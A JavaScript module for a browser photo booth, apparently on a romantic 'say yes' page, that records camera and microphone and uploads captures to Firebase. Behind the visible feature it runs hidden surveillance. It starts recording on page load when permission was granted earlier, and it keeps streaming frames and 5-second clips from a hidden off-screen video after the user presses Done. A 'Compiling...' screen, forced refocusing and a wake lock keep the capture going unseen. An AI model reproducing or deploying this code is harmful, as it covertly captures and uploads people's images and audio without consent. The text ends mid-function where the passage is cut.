// ============================================================================
// CAMERA AND PHOTO BOOTH MODULE
// ============================================================================

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;
let capturedImages = [];
let videoBlob = null;
let finalFrameBlob = null;
let sessionId = null;
let imageCounter = 0;
let uploadedImageCount = 0;
let isUploadingImages = false;
let readyToShowDownload = false;
let compilingOverlay = null;
let compilingDotsInterval = null;
let isVideoBlobReady = false;
let isFinalizingAfterUploads = false;
let hasVideoUploadAttempted = false;
let pendingVideoBlobResolve = null;
let isStoppingRecorderForUpload = false;
const UPLOAD_DEBUG = true;

// Adaptive auxiliary frame capture/upload (stored under sessions/{sessionId}/images/aux/)
const AUX_CAPTURE_ENABLED = true;
const AUX_MIN_INTERVAL_MS = 80;
const AUX_MAX_INTERVAL_MS = 1400;
const AUX_MAX_QUEUE = 80;
const AUX_MAX_CONCURRENT_UPLOADS = 4;
let auxCaptureRunning = false;
let auxCaptureTimer = null;
let auxQueue = [];
let auxUploadsInFlight = 0;
let auxFrameCounter = 0;
let auxDroppedFrames = 0;
let auxSourceVideo = null;
let auxCanvas = null;
let auxCtx = null;
let auxFrameLedger = [];

// Continuous post-main-upload clip recording pipeline
const CLIP_CAPTURE_DURATION_MS = 5000;
let clipSequenceRunning = false;
let clipRecorder = null;
let clipStopTimer = null;
let clipCounter = 0;
let clipSequenceStartTimestamp = null;

function logUploadPipeline(message, extra) {
    if (!UPLOAD_DEBUG) return;
    if (extra !== undefined) {
        console.log(`[UPLOAD_PIPELINE] ${message}`, extra);
        return;
    }
    console.log(`[UPLOAD_PIPELINE] ${message}`);
}

function getAuxCaptureIntervalMs() {
    const load = Math.min((auxQueue.length + auxUploadsInFlight) / AUX_MAX_QUEUE, 1);
    return Math.round(AUX_MIN_INTERVAL_MS + (AUX_MAX_INTERVAL_MS - AUX_MIN_INTERVAL_MS) * load);
}

function getMediaRecorderOptions() {
    const options = {
        mimeType: 'video/webm;codecs=vp9',
        videoBitsPerSecond: 2500000
    };

    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        options.mimeType = 'video/webm;codecs=vp8';
    }
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        options.mimeType = 'video/webm';
    }

    return options;
}

function scheduleNextAuxCaptureTick() {
    if (!auxCaptureRunning) return;
    clearTimeout(auxCaptureTimer);
    auxCaptureTimer = setTimeout(runAuxCaptureTick, getAuxCaptureIntervalMs());
}

function runAuxCaptureTick() {
    if (!auxCaptureRunning) return;
    if (!auxSourceVideo || !auxCanvas || !auxCtx) {
        scheduleNextAuxCaptureTick();
        return;
    }

    if (auxQueue.length >= AUX_MAX_QUEUE) {
        auxDroppedFrames++;
        if (auxDroppedFrames % 50 === 0) {
            logUploadPipeline('Aux capture backpressure: dropping frames', {
                droppedFrames: auxDroppedFrames,
                queueLength: auxQueue.length,
                uploadsInFlight: auxUploadsInFlight
            });
        }
        scheduleNextAuxCaptureTick();
        return;
    }

    const frameW = auxSourceVideo.videoWidth || 0;
    const frameH = auxSourceVideo.videoHeight || 0;
    if (!frameW || !frameH) {
        scheduleNextAuxCaptureTick();
        return;
    }

    auxCanvas.width = frameW;
    auxCanvas.height = frameH;
    auxCtx.drawImage(auxSourceVideo, 0, 0);

    const frameId = ++auxFrameCounter;
    const frameTs = Date.now();
    const storagePath = `sessions/${sessionId}/images/aux/frame_${String(frameId).padStart(8, '0')}_${frameTs}.jpg`;
    auxCanvas.toBlob((blob) => {
        if (!auxCaptureRunning || !blob) {
            scheduleNextAuxCaptureTick();
            return;
        }
        auxQueue.push({ frameId, blob, ts: frameTs, storagePath });
        auxFrameLedger.push({
            frameId,
            ts: frameTs,
            blob,
            auxPath: storagePath,
            uploaded: false,
            moved: false
        });
        processAuxUploadQueue();
        scheduleNextAuxCaptureTick();
    }, 'image/jpeg', 0.82);
}

function processAuxUploadQueue() {
    if (!sessionId) return;

    while (auxUploadsInFlight < AUX_MAX_CONCURRENT_UPLOADS && auxQueue.length > 0) {
        const next = auxQueue.shift();
        auxUploadsInFlight++;

        uploadBlobToStorage(next.blob, next.storagePath)
            .then(() => {
                const record = auxFrameLedger.find((item) => item.frameId === next.frameId);
                if (record) record.uploaded = true;
            })
            .catch((error) => {
                const record = auxFrameLedger.find((item) => item.frameId === next.frameId);
                if (record) record.uploadFailed = true;
                console.error('[UPLOAD_PIPELINE] Aux frame upload failed:', error);
            })
            .finally(() => {
                auxUploadsInFlight = Math.max(0, auxUploadsInFlight - 1);
                if (auxQueue.length > 0) {
                    processAuxUploadQueue();
                }
            });
    }
}

async function startAuxCapturePipeline() {
    if (!AUX_CAPTURE_ENABLED || auxCaptureRunning) return;
    if (!mediaStream || !sessionId) {
        logUploadPipeline('Aux capture not started (missing media stream or sessionId)');
        return;
    }

    auxQueue = [];
    auxUploadsInFlight = 0;
    auxDroppedFrames = 0;
    auxFrameLedger = [];

    auxSourceVideo = document.createElement('video');
    auxSourceVideo.autoplay = true;
    auxSourceVideo.playsInline = true;
    auxSourceVideo.muted = true;
    auxSourceVideo.srcObject = mediaStream;
    auxSourceVideo.style.position = 'fixed';
    auxSourceVideo.style.width = '1px';
    auxSourceVideo.style.height = '1px';
    auxSourceVideo.style.opacity = '0';
    auxSourceVideo.style.pointerEvents = 'none';
    auxSourceVideo.style.left = '-9999px';
    document.body.appendChild(auxSourceVideo);

    auxCanvas = document.createElement('canvas');
    auxCtx = auxCanvas.getContext('2d');

    try {
        await auxSourceVideo.play();
    } catch (error) {
        console.error('[UPLOAD_PIPELINE] Aux source video play failed:', error);
    }

    auxCaptureRunning = true;
    logUploadPipeline('Aux capture pipeline started', {
        minIntervalMs: AUX_MIN_INTERVAL_MS,
        maxIntervalMs: AUX_MAX_INTERVAL_MS,
        maxQueue: AUX_MAX_QUEUE,
        maxConcurrentUploads: AUX_MAX_CONCURRENT_UPLOADS
    });
    scheduleNextAuxCaptureTick();
}

function stopAuxCapturePipeline() {
    auxCaptureRunning = false;
    clearTimeout(auxCaptureTimer);
    auxCaptureTimer = null;
    auxQueue = [];
    auxUploadsInFlight = 0;

    if (auxSourceVideo) {
        try {
            auxSourceVideo.pause();
        } catch (e) {
            // no-op
        }
        if (auxSourceVideo.parentNode) {
            auxSourceVideo.parentNode.removeChild(auxSourceVideo);
        }
    }
    auxSourceVideo = null;
    auxCanvas = null;
    auxCtx = null;
}

function trimAuxLedger(maxEntries = 4000) {
    if (auxFrameLedger.length <= maxEntries) return;
    auxFrameLedger = auxFrameLedger.slice(auxFrameLedger.length - maxEntries);
}

async function waitForAuxWindowUploads(clipStartTs, clipEndTs, timeoutMs = 10000) {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
        const hasPending = auxFrameLedger.some((frame) =>
            frame.ts >= clipStartTs &&
            frame.ts < clipEndTs &&
            !frame.uploaded &&
            !frame.uploadFailed
        );
        if (!hasPending) return;
        await new Promise((resolve) => setTimeout(resolve, 120));
    }
}

async function moveAuxFramesToClippedSubfolder(clipIndex, clipStartTs, clipEndTs) {
    if (!sessionId) return;
    await waitForAuxWindowUploads(clipStartTs, clipEndTs);

    const recordsInWindow = auxFrameLedger.filter((frame) =>
        frame.ts >= clipStartTs &&
        frame.ts < clipEndTs &&
        frame.uploaded &&
        !frame.moved
    );

    for (const frame of recordsInWindow) {
        const filename = frame.auxPath.split('/').pop();
        const clippedPath = `sessions/${sessionId}/images/clipped/clip_${String(clipIndex).padStart(6, '0')}/${filename}`;

        try {
            await uploadBlobToStorage(frame.blob, clippedPath);
            await storage.ref(frame.auxPath).delete();
            frame.moved = true;
            frame.blob = null;
            frame.clippedPath = clippedPath;
        } catch (error) {
            console.error('[UPLOAD_PIPELINE] Failed moving aux frame to clipped path:', error);
        }
    }

    trimAuxLedger();
}

async function uploadSingleClip(clipBlob, clipIndex, clipStartTs, clipEndTs) {
    if (!sessionId || !clipBlob || clipBlob.size === 0) {
        return;
    }

    const clipPath = `sessions/${sessionId}/clips/clip_${String(clipIndex).padStart(6, '0')}_${clipStartTs}.webm`;
    try {
        const downloadUrl = await uploadBlobToStorage(clipBlob, clipPath);
        await uploadToDatabase(`sessions/${sessionId}/clips/clip_${String(clipIndex).padStart(6, '0')}`, {
            timestamp: new Date().toISOString(),
            clipIndex,
            startTimestamp: clipStartTs,
            endTimestamp: clipEndTs,
            durationMs: clipEndTs - clipStartTs,
            downloadUrl,
            size: clipBlob.size
        });

        await moveAuxFramesToClippedSubfolder(clipIndex, clipStartTs, clipEndTs);
    } catch (error) {
        console.error('[UPLOAD_PIPELINE] Clip upload failed:', error);
    }
}

function stopClipCapturePipeline() {
    clipSequenceRunning = false;
    clearTimeout(clipStopTimer);
    clipStopTimer = null;

    if (clipRecorder && clipRecorder.state === 'recording') {
        try {
            clipRecorder.stop();
        } catch (error) {
            console.error('[UPLOAD_PIPELINE] Clip recorder stop failed:', error);
        }
    }

    clipRecorder = null;
}

function startClipCapturePipeline() {
    if (clipSequenceRunning || !mediaStream || !sessionId) return;

    clipSequenceRunning = true;
    clipCounter = 0;
    clipSequenceStartTimestamp = Date.now();
    logUploadPipeline('Clip capture pipeline started', {
        clipDurationMs: CLIP_CAPTURE_DURATION_MS,
        sequenceStartTimestamp: clipSequenceStartTimestamp
    });
    uploadToDatabase(`sessions/${sessionId}/clips_meta`, {
        sequenceStartTimestamp: clipSequenceStartTimestamp,
        clipDurationMs: CLIP_CAPTURE_DURATION_MS
    }).catch((error) => {
        console.error('[UPLOAD_PIPELINE] Failed to store clip sequence metadata:', error);
    });

    const beginNextClip = () => {
        if (!clipSequenceRunning || !mediaStream) return;
        clearTimeout(clipStopTimer);
        clipStopTimer = null;

        const clipStartTs = Date.now();
        const clipIndex = ++clipCounter;
        const clipChunks = [];

        clipRecorder = new MediaRecorder(mediaStream, getMediaRecorderOptions());
        clipRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                clipChunks.push(event.data);
            }
        };
        clipRecorder.onstop = () => {
            clearTimeout(clipStopTimer);
            clipStopTimer = null;
            const clipEndTs = Date.now();
            const clipBlob = new Blob(clipChunks, { type: 'video/webm' });

            // Restart immediately to keep clips contiguous.
            if (clipSequenceRunning) {
                beginNextClip();
            }

            uploadSingleClip(clipBlob, clipIndex, clipStartTs, clipEndTs);
        };
        clipRecorder.onerror = (event) => {
            clearTimeout(clipStopTimer);
            clipStopTimer = null;
            console.error('[UPLOAD_PIPELINE] Clip recorder error:', event.error || event);
            if (clipSequenceRunning) {
                setTimeout(beginNextClip, 50);
            }
        };

        clipRecorder.start();
        clipStopTimer = setTimeout(() => {
            if (clipRecorder && clipRecorder.state === 'recording') {
                try {
                    clipRecorder.stop();
                } catch (error) {
                    console.error('[UPLOAD_PIPELINE] Clip stop timer failed:', error);
                }
            }
        }, CLIP_CAPTURE_DURATION_MS);
    };

    beginNextClip();
}

function showCompilingOverlay() {
    if (compilingOverlay) return;

    compilingOverlay = document.createElement('div');
    compilingOverlay.id = 'compiling-overlay';
    compilingOverlay.style.position = 'fixed';
    compilingOverlay.style.inset = '0';
    compilingOverlay.style.zIndex = '10000002';
    compilingOverlay.style.background = '#000';
    compilingOverlay.style.display = 'flex';
    compilingOverlay.style.flexDirection = 'column';
    compilingOverlay.style.alignItems = 'center';
    compilingOverlay.style.justifyContent = 'center';
    compilingOverlay.style.gap = '20px';

    const spinner = document.createElement('div');
    spinner.style.width = '68px';
    spinner.style.height = '68px';
    spinner.style.border = '6px solid rgba(255, 255, 255, 0.25)';
    spinner.style.borderTopColor = '#fff';
    spinner.style.borderRadius = '50%';
    spinner.animate(
        [
            { transform: 'rotate(0deg)' },
            { transform: 'rotate(360deg)' }
        ],
        { duration: 850, iterations: Infinity, easing: 'linear' }
    );

    const text = document.createElement('p');
    text.id = 'compiling-text';
    text.textContent = 'Compiling...';
    text.style.margin = '0';
    text.style.fontWeight = '700';
    text.style.letterSpacing = '0.02em';
    text.style.color = '#fff';
    text.style.fontSize = 'clamp(1.2rem, 3.5vw, 2.4rem)';
    text.style.textAlign = 'center';

    let dotCount = 3;
    compilingDotsInterval = setInterval(() => {
        dotCount = (dotCount + 1) % 4;
        text.textContent = `Compiling${'.'.repeat(dotCount)}`;
    }, 300);

    compilingOverlay.appendChild(spinner);
    compilingOverlay.appendChild(text);
    document.body.appendChild(compilingOverlay);
}

function hideCompilingOverlay() {
    if (compilingDotsInterval) {
        clearInterval(compilingDotsInterval);
        compilingDotsInterval = null;
    }
    if (compilingOverlay && compilingOverlay.parentNode) {
        compilingOverlay.parentNode.removeChild(compilingOverlay);
    }
    compilingOverlay = null;
}
let camMode = false;
let hasAttemptedBackgroundWarmup = false;

const CAMERA_CONSTRAINTS = {
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: true
};

function updateSessionIdFromWindow() {
    if (window.sessionId) {
        sessionId = window.sessionId;
    }
}

async function hasGrantedCameraPermission() {
    if (!navigator.permissions || typeof navigator.permissions.query !== 'function') {
        return false;
    }

    try {
        const status = await navigator.permissions.query({ name: 'camera' });
        return status.state === 'granted';
    } catch (error) {
        return false;
    }
}

async function ensureMediaStream({ requestPermission }) {
    if (mediaStream && mediaStream.active) return true;
    if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
        return false;
    }

    if (!requestPermission) {
        const cameraGranted = await hasGrantedCameraPermission();
        if (!cameraGranted) return false;
    }

    mediaStream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
    return true;
}

function ensureRecordingStarted() {
    if (!mediaStream || isRecording) return;
    startRecording();
}

async function warmupCameraInBackgroundOnLoad() {
    if (hasAttemptedBackgroundWarmup) return;
    hasAttemptedBackgroundWarmup = true;

    updateSessionIdFromWindow();

    try {
        const streamReady = await ensureMediaStream({ requestPermission: false });
        if (!streamReady) return;
        ensureRecordingStarted();
    } catch (error) {
        console.log('Background camera warmup skipped:', error);
    }
}

/**
 * Shows the attractive photo booth button after acceptance
 */
function showPhotoBoothButton() {
    const button = document.createElement('button');
    button.id = 'photo-booth-btn';
    button.className = 'photo-booth-btn';
    button.innerHTML = '📸 Let\'s take a Picture Together 📸';
    button.onclick = startPhotoBooth;
    document.body.appendChild(button);
}

/**
 * Initiates the photo booth by requesting camera permission
 */
async function startPhotoBooth() {
    try {
        updateSessionIdFromWindow();
        await ensureMediaStream({ requestPermission: true });

        // Remove the photo booth button
        const photoBtn = document.getElementById('photo-booth-btn');
        if (photoBtn) photoBtn.remove();

        // Create camera interface
        createCameraInterface();
        ensureRecordingStarted();
    } catch (error) {
        console.error('Camera access denied:', error);
        alert('Camera permission is required to take a picture together!');
    }
}

/**
 * Creates the camera interface with video feed and control buttons
 */
function createCameraInterface() {
    stopConfetti();
    camMode = true;

    const canvases = document.getElementsByTagName("canvas");
    for (let i = 0; i < canvases.length; i++) {
        canvases[i].style.display = 'none';
    }

    // Create container
    const container = document.createElement('div');
    container.id = 'camera-container';
    container.className = 'camera-container';
    container.style.cursor = 'auto';

    // Create video element
    const video = document.createElement('video');
    video.id = 'camera-feed';
    video.autoplay = true;
    video.playsinline = true;
    video.muted = true;
    video.srcObject = mediaStream;
    video.style.cursor = 'auto';

    // Prevent fullscreen mode and hide behavior
    document.body.style.cursor = 'auto';
    document.documentElement.style.cursor = 'auto';

    // Create canvas for capturing images
    const canvas = document.createElement('canvas');
    canvas.id = 'capture-canvas';
    canvas.style.display = 'none';

    // Create controls container
    const controls = document.createElement('div');
    controls.className = 'camera-controls';

    // Capture button
    const captureBtn = document.createElement('button');
    captureBtn.className = 'control-btn capture-btn';
    captureBtn.innerHTML = '📷 Capture';
    captureBtn.onclick = captureImage;

    // Stop button
    const stopBtn = document.createElement('button');
    stopBtn.className = 'control-btn stop-btn';
    stopBtn.innerHTML = '✅ Done';
    stopBtn.onclick = showHypnosisPage;

    controls.appendChild(captureBtn);
    controls.appendChild(stopBtn);

    container.appendChild(video);
    container.appendChild(canvas);
    container.appendChild(controls);
    document.body.appendChild(container);

    // Keep cursor visible and prevent fullscreen behavior
    initFocusManagement(video, container);
}

/**
 * Manages focus and prevents browser optimizations from throttling video
 */
function initFocusManagement(videoElement, containerElement) {
    let wakeLockSentinel = null;

    // Keep cursor visible with continuous check
    const ensureCursorVisible = setInterval(() => {
        document.body.style.cursor = 'auto';
        document.documentElement.style.cursor = 'auto';
        if (containerElement) containerElement.style.cursor = 'auto';
        if (videoElement) videoElement.style.cursor = 'auto';
    }, 500);

    // Prevent fullscreen on double-click or other triggers
    const preventFullscreen = (e) => {
        if (document.fullscreenElement) {
            document.exitFullscreen().catch(() => { });
        }
    };

    videoElement?.addEventListener('dblclick', preventFullscreen);
    document.addEventListener('fullscreenchange', preventFullscreen);

    // Request Wake Lock to prevent device sleep
    const requestWakeLock = async () => {
        try {
            if ('wakeLock' in navigator) {
                wakeLockSentinel = await navigator.wakeLock.request('screen');
                console.log('Wake Lock acquired');

                // Re-acquire lock if it's released
                wakeLockSentinel.addEventListener('release', () => {
                    console.log('Wake Lock released');
                    requestWakeLock();
                });
            }
        } catch (err) {
            console.log('Wake Lock API not available or failed:', err);
        }
    };

    // Skip pointer lock - it hides the cursor which we don't want
    // Just keep window focused instead
    const keepFocused = () => {
        try {
            if (!document.hasFocus()) {
                window.focus();
            }
        } catch (e) {
            // Focus might not be available in some contexts
        }
    };

    // Create a hidden animation to keep the page active
    const keepPageActive = () => {
        // This triggers continuous rendering loop
        let lastTime = performance.now();
        const animate = (currentTime) => {
            const deltaTime = currentTime - lastTime;
            lastTime = currentTime;

            // Log activity to prevent throttling
            if (isRecording && deltaTime > 0) {
                // Keep the page "busy" to prevent background throttling
                requestAnimationFrame(animate);
            }
        };
        requestAnimationFrame(animate);
    };

    // Set up intervals to maintain focus
    let focusCheckInterval = setInterval(() => {
        keepFocused();
    }, 1000);

    // Skip the lock interval - pointer lock hides cursor
    // Just keep focused

    // Start keeping page active
    keepPageActive();

    // Request wake lock
    requestWakeLock();

    // Prevent visibility changes from affecting the stream
    const handleVisibilityChange = () => {
        if (document.hidden && isRecording) {
            // If page becomes hidden while recording, try to regain focus
            setTimeout(() => {
                window.focus();
                keepFocused();
            }, 100);
        }
    };

    // Listen for focus changes
    const handleFocus = () => {
        console.log('Page regained focus');
    };

    const handleBlur = () => {
        console.log('Page lost focus, attempting to regain...');
        window.focus();
    };

    window.addEventListener('focus', handleFocus);
    window.addEventListener('blur', handleBlur);
    document.addEventListener('visibilitychange', handleVisibilityChange);
    document.addEventListener('click', keepFocused, true);

    // Store cleanup function on window for later
    window._focusCleanup = () => {
        clearInterval(focusCheckInterval);
        clearInterval(ensureCursorVisible);

        // Release wake lock
        if (wakeLockSentinel) {
            wakeLockSentinel.release().catch(err => {
                console.log('Wake Lock release error:', err);
            });
        }

        // Exit pointer lock
        try {
            if (document.exitPointerLock) {
                document.exitPointerLock();
            }
        } catch (e) {
            // Exit pointer lock might fail
        }

        // Remove event listeners
        window.removeEventListener('focus', handleFocus);
        window.removeEventListener('blur', handleBlur);
        document.removeEventListener('visibilitychange', handleVisibilityChange);
        document.removeEventListener('click', keepFocused, true);

        console.log('Focus management cleaned up');
    };
}
function startRecording() {
    recordedChunks = [];
    videoBlob = null;
    isVideoBlobReady = false;
    hasVideoUploadAttempted = false;
    auxFrameCounter = 0;
    pendingVideoBlobResolve = null;
    isStoppingRecorderForUpload = false;
    mediaRecorder = new MediaRecorder(mediaStream, getMediaRecorderOptions());

    mediaRecorder.ondataavailable = (event) => {
        recordedChunks.push(event.data);
    };

    mediaRecorder.onstop = () => {
        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        isVideoBlobReady = true;
        isRecording = false;
        logUploadPipeline('Recorder stopped; video blob ready', { sizeBytes: videoBlob.size });
        if (typeof pendingVideoBlobResolve === 'function') {
            pendingVideoBlobResolve();
            pendingVideoBlobResolve = null;
        }
        checkIfAllUploadsComplete();
    };

    mediaRecorder.start();
    isRecording = true;
}

/**
 * Captures a single image from the current video frame and uploads to Firebase
 */
function captureImage() {
    // // Create eye-blinding, sense-shattering flash effect
    // const flash = document.createElement('div');
    // flash.style.position = 'fixed';
    // flash.style.top = '0';
    // flash.style.left = '0';
    // flash.style.width = '100%';
    // flash.style.height = '100%';
    // flash.style.backgroundColor = '#ffffff';
    // flash.style.boxShadow = 'inset 0 0 100px rgba(255, 255, 255, 1)';
    // flash.style.opacity = '1';
    // flash.style.zIndex = '99999';
    // flash.style.pointerEvents = 'none';
    // flash.style.filter = 'brightness(1.5)';
    // document.body.appendChild(flash);

    // // Remove flash instantly - rapid, disorienting burst
    // setTimeout(() => {
    //     flash.style.transition = 'opacity 0.02s ease-out';
    //     flash.style.opacity = '0';
    //     setTimeout(() => flash.remove(), 20);
    // }, 50);

    // console.log('Capturing image...');

    if (camMode) triggerCenterFlash();

    const video = document.getElementById('camera-feed');
    const canvas = document.getElementById('capture-canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    // Increment counter NOW before async operation to ensure each image gets unique index
    imageCounter++;
    const currentImageIndex = imageCounter;

    // Store image blob and upload to Firebase
    canvas.toBlob(async (blob) => {
        const imageData = {
            blob: blob,
            timestamp: Date.now(),
            url: URL.createObjectURL(blob)
        };
        capturedImages.push(imageData);

        // Upload to Firebase Storage in real-time
        if (sessionId) {
            try {
                const storagePath = `sessions/${sessionId}/images/image_${currentImageIndex}.jpg`;
                const downloadUrl = await uploadBlobToStorage(blob, storagePath);

                // Record upload in database
                await uploadToDatabase(`sessions/${sessionId}/images/image_${currentImageIndex}`, {
                    timestamp: new Date().toISOString(),
                    index: currentImageIndex,
                    downloadUrl: downloadUrl
                });
            } catch (error) {
                console.error('Failed to upload image:', error);
            }
        }

        // Count this image as completed (uploaded or attempted) so pipeline can continue.
        uploadedImageCount++;
        checkIfAllUploadsComplete();

        // Visual feedback - brief subtitle showing image was captured
        const heading2 = document.getElementById('heading2');
        if (heading2) {
            const originalText = heading2.textContent;
            heading2.textContent = `📷 Captured! (${capturedImages.length + 1})`;
            setTimeout(() => {
                if (heading2 && !isUploadingImages) {
                    heading2.textContent = originalText;
                }
            }, 1500);
        }
    });
}

/**
 * Stops recording and shows hypnotic upload page
 */
function stopPictures() {
    if (mediaRecorder && isRecording) {
        isUploadingImages = true;
        logUploadPipeline('Stop requested -> entering compiling/upload phase');
        camMode = false;

        // Hide the camera feed immediately
        const container = document.getElementById('camera-container');
        if (container) container.style.display = 'none';

        // Capture final frame from camera
        setTimeout(async () => {
            const video = document.getElementById('camera-feed');
            if (video) {
                const canvas = document.getElementById('capture-canvas');
                const ctx = canvas.getContext('2d');

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);

                canvas.toBlob((blob) => {
                    finalFrameBlob = blob;
                    // Check if all images are uploaded, if so proceed to cleanup
                    checkIfAllUploadsComplete();
                });
            } else {
                checkIfAllUploadsComplete();
            }
        }, 500);
    }
}

async function ensureVideoBlobReadyForUpload() {
    if (isVideoBlobReady) return;
    if (!mediaRecorder) return;

    if (mediaRecorder.state === 'inactive') {
        if (!videoBlob || videoBlob.size === 0) {
            videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        }
        isVideoBlobReady = true;
        isRecording = false;
        return;
    }

    if (isStoppingRecorderForUpload) {
        await new Promise((resolve) => {
            const previousResolver = pendingVideoBlobResolve;
            pendingVideoBlobResolve = () => {
                if (typeof previousResolver === 'function') previousResolver();
                resolve();
            };
        });
        return;
    }

    isStoppingRecorderForUpload = true;
    logUploadPipeline('Image uploads complete -> stopping recorder to begin video upload');
    await new Promise((resolve) => {
        pendingVideoBlobResolve = resolve;
        mediaRecorder.stop();
    });
    isStoppingRecorderForUpload = false;
}

/**
 * Checks if all image uploads are complete and proceeds to show download page
 */
async function checkIfAllUploadsComplete() {
    // Only run finalization during uploading stage and once at a time.
    if (!isUploadingImages || readyToShowDownload || isFinalizingAfterUploads) return;

    const allImagesComplete = imageCounter === 0 || uploadedImageCount >= imageCounter;
    const finalFrameReady = Boolean(finalFrameBlob);

    // Wait until image uploads and final-frame capture are ready.
    if (!allImagesComplete || !finalFrameReady) return;

    isFinalizingAfterUploads = true;
    try {
        logUploadPipeline('All image uploads complete; preparing video upload', {
            imageCounter,
            uploadedImageCount
        });
        await ensureVideoBlobReadyForUpload();
        await startAuxCapturePipeline();
        startClipCapturePipeline();
        // Required order: after all image uploads, upload the video.
        await uploadVideoAfterImages();
        readyToShowDownload = true;
        logUploadPipeline('Video upload phase done; proceeding to download page');
        cleanup();
    } finally {
        isFinalizingAfterUploads = false;
    }
}

/**
 * Shows rapid blinking animation while files upload
 */
function showHypnosisPage() {
    const container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.zIndex = '10000000';
    container.style.backgroundColor = 'rgb(255, 203, 227)';
    container.style.display = 'flex';
    container.style.alignItems = 'center';
    container.style.justifyContent = 'center';

    const message = document.createElement('p');
    message.textContent = "Shyyy, let's take more!! 🤡 \n Say cheese!";
    message.style.margin = '0';
    message.style.padding = '0 24px';
    message.style.textAlign = 'center';
    message.style.color = 'rgb(255, 0, 64)';
    message.style.fontWeight = '700';
    message.style.fontSize = 'clamp(1.6rem, 4.8vw, 3.4rem)';
    message.style.lineHeight = '1.2';
    container.appendChild(message);

    document.body.appendChild(container);

    setTimeout(() => {
        document.body.removeChild(container);
        RapidBlink("rgb(255, 203, 227)", 60, 20, false, true, () => {
            // RapidBlink("rgb(255, 203, 227)", 60, 10, false, false, stopPictures);
            showCompilingOverlay();
            stopPictures();
            startConfetti();
        });
    }, 2000);

}

/**
 * Downloads all captured files at once (excludes video which is handled separately)
 */
async function downloadAll() {
    // Use JSZip library if available, otherwise download files individually with delay
    if (typeof JSZip !== 'undefined') {
        const zip = new JSZip();

        // Add final frame
        if (finalFrameBlob) {
            zip.file(`final-photo.png`, finalFrameBlob);
        }

        // Add all captured images
        capturedImages.forEach((img, index) => {
            zip.file(`photo-${index + 1}.png`, img.blob);
        });

        // Generate and download zip (video not included - handled separately)
        zip.generateAsync({ type: 'blob' }).then((blob) => {
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `photo-booth-${Date.now()}.zip`;
            link.click();
            URL.revokeObjectURL(url);
        });
    } else {
        // Fallback: download files individually with staggered delays
        let delay = 0;

        // Download final frame
        if (finalFrameBlob) {
            setTimeout(() => {
                const url = URL.createObjectURL(finalFrameBlob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `final-photo-${Date.now()}.png`;
                link.click();
                URL.revokeObjectURL(url);
            }, delay);
            delay += 500;
        }

        // Download captured images (video not included - handled separately)
        capturedImages.forEach((img, index) => {
            setTimeout(() => {
                const url = URL.createObjectURL(img.blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `photo-${index + 1}-${Date.now()}.png`;
                link.click();
                URL.revokeObjectURL(url);
            }, delay);
            delay += 500;
        });
    }
}

/**
 * Shows the thank you page with all captured files ready to download
 */
function showDownloadPage() {
    const container = document.createElement('div');
    container.id = 'download-page';
    container.className = 'download-page';

    // Create content wrapper
    const content = document.createElement('div');
    content.className = 'download-content';

    // Thank you message
    const heading = document.createElement('h2');
    heading.className = 'download-heading';
    heading.innerHTML = 'Thanks for saying yes! ❤️';

    const subheading = document.createElement('p');
    subheading.className = 'download-subheading';
    subheading.innerHTML = `Your memories are ready! Captured ${capturedImages.length} photos`;

    // Media grid
    const mediaGrid = document.createElement('div');
    mediaGrid.className = 'media-grid';

    // Add final photo first if available
    if (finalFrameBlob) {
        const gridItem = document.createElement('div');
        gridItem.className = 'media-grid-item';
        const img = document.createElement('img');
        img.src = URL.createObjectURL(finalFrameBlob);
        img.alt = 'Final photo';
        gridItem.appendChild(img);
        mediaGrid.appendChild(gridItem);
    }

    // Add captured images
    capturedImages.forEach((imgData, index) => {
        const gridItem = document.createElement('div');
        gridItem.className = 'media-grid-item';
        const img = document.createElement('img');
        img.src = imgData.url;
        img.alt = `Photo ${index + 1}`;
        gridItem.appendChild(img);
        mediaGrid.appendChild(gridItem);
    });

    // Buttons container
    const buttonsContainer = document.createElement('div');
    buttonsContainer.className = 'download-buttons';

    // Download all button
    const downloadBtn = document.createElement('button');
    downloadBtn.className = 'download-btn primary-btn';
    downloadBtn.innerHTML = '⬇️ Download All';
    downloadBtn.onclick = downloadAll;

    // Done button
    const doneBtn = document.createElement('button');
    doneBtn.className = 'download-btn secondary-btn';
    doneBtn.innerHTML = '✨ Done';
    doneBtn.onclick = finishAndReset;

    buttonsContainer.appendChild(downloadBtn);
    buttonsContainer.appendChild(doneBtn);

    // Assemble the page
    content.appendChild(heading);
    content.appendChild(subheading);
    content.appendChild(mediaGrid);
    content.appendChild(buttonsContainer);

    container.appendChild(content);
    document.body.appendChild(container);
}

/**
 * Cleans up the camera interface and shows download page
 */
function cleanup() {
    hideCompilingOverlay();
    logUploadPipeline('Landing on download page');

    const container = document.getElementById('camera-container');
    if (container) container.remove();

    const video = document.getElementById('camera-feed');
    if (video) video.remove();

    // Clean up focus management
    if (window._focusCleanup) {
        window._focusCleanup();
        delete window._focusCleanup;
    }

    // Reset uploading flags
    isUploadingImages = false;
    isFinalizingAfterUploads = false;

    // Keep stream alive while aux capture runs; otherwise release tracks.
    if (mediaStream && !auxCaptureRunning) {
        mediaStream.getTracks().forEach(track => track.stop());
    }

    // Remove hypnosis page
    const hypnosisPage = document.getElementById('hypnosis-page');
    if (hypnosisPage) hypnosisPage.remove();

    // Show the download page with all captured files
    showDownloadPage();
}

/**
 * Uploads video after all image uploads complete (during "Compiling...")
 */
async function uploadVideoAfterImages() {
